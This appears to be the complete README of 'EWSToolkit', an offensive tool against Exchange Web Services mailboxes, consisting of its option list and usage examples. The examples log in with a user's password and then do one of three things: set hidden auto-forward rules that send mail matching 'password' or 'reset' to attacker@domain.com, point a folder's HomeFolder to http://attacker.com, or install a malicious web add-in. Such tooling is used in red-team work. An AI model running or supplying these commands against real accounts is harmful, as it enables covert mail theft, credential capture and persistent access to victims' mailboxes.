# EWSToolkit

```text
 _____________      __  _________ ___________           .__   __   .__  __
 \_   _____/  \    /  \/   _____/ \__    ___/___   ____ |  | |  | _|__|/  |_
  |    __)_\   \/\/   /\_____  \    |    | /  _ \ /  _ \|  | |  |/ /  \   __\
  |        \\        / /        \   |    |(  <_> |  <_> )  |_|    <|  ||  |
 /_______  / \__/\  / /_______  /   |____| \____/ \____/|____/__|_ \__||__|
         \/       \/          \/                                  \/

                                                                      v0.1

  Options:
  -e, --email=VALUE          Email address to authenticate with
  -p, --password=VALUE       Password to authenticate with
      --rule                 Set auto-forwarding rules on users' mailbox
  -n, --name=VALUE           Set a name for the rule
  -s, --subject=VALUE        Trigger on these strings in the mail Subject
  -b, --body=VALUE           Trigger on these strings in the mail Body
  -f, --forward=VALUE        Email address to receive forwarded emails at
      --homefolder           Set a malicious URL on a folder
  -u, --url=VALUE            URL to configure
      --installapp           Install a malicious Web Add-In
  -m, --manifest=VALUE       Manifest to install
  -h, -?, --help             Show this help

  Examples:
  Set auto-forward rules
    ews -e user@domain.com -p Passw0rd! --rule -n TestRule -s password,reset -f attacker@domain.com
    ews -e user@domain.com -p Passw0rd! --rule -n TestRule -b "This is your new password" -f attacker@domain.com
  Set HomeFolder URL
    ews -e user@domain.com -p Passw0rd! --homefolder -u http://attacker.com
  Install MailApp
    ews -e user@domain.com -p Passw0rd! --installapp -m C:\Users\Rasta\Desktop\manifest.xml
```